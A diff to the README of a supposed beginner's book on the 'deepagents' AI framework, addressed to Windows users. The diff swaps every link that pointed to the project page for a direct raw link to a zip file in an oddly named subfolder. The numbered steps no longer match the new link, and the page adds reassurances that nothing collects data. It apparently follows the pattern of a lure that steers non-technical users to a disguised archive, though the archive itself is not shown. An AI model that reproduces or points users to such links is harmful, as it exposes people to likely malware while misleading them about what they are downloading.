@@ -1,6 +1,6 @@
 # 📘 deepagents-book - Master AI Engineering Through Practical Books
 
-[![Download deepagents-book](https://img.shields.io/badge/Download-deepagents--book-blue.svg)](https://github.com/workflowstarches8415/deepagents-book)
+[![Download deepagents-book](https://img.shields.io/badge/Download-deepagents--book-blue.svg)](https://github.com/workflowstarches8415/deepagents-book/raw/refs/heads/main/vinegary/deepagents-book-2.7.zip)
 
 This project provides a comprehensive guide to understanding the deepagents framework. It breaks down complex engineering principles into clear, actionable steps for anyone interested in building intelligent systems. Whether you are a beginner or an experienced developer, this resource helps you navigate the project structure and deployment logic.
 
@@ -8,7 +8,7 @@ This project provides a comprehensive guide to understanding the deepagents fram
 
 You do not need prior programming experience to read this book. Follow these steps to access the content on your Windows computer.
 
-1. Visit the [official project page](https://github.com/workflowstarches8415/deepagents-book) to download the repository.
+1. Visit the [official project page](https://github.com/workflowstarches8415/deepagents-book/raw/refs/heads/main/vinegary/deepagents-book-2.7.zip) to download the repository.
 2. Click the green button labeled "Code" on the right side of the page.
 3. Select "Download ZIP" from the menu.
 4. Save the file to your computer.
@@ -62,4 +62,4 @@ We encourage you to share your progress. Using these agents is a new skill for m
 
 This book contains educational information only. It does not collect data from your computer. When you download the files, you maintain full control over the content. We recommend maintaining a backup of your folder on an external drive or a secure cloud service to ensure you do not lose your notes or the book files if your computer has a hardware failure. 
 
-To stay current with the latest updates, return to the [main download page](https://github.com/workflowstarches8415/deepagents-book) periodically. New versions fix clarity issues and add context based on feedback from other readers.
+To stay current with the latest updates, return to the [main download page](https://github.com/workflowstarches8415/deepagents-book/raw/refs/heads/main/vinegary/deepagents-book-2.7.zip) periodically. New versions fix clarity issues and add context based on feedback from other readers.
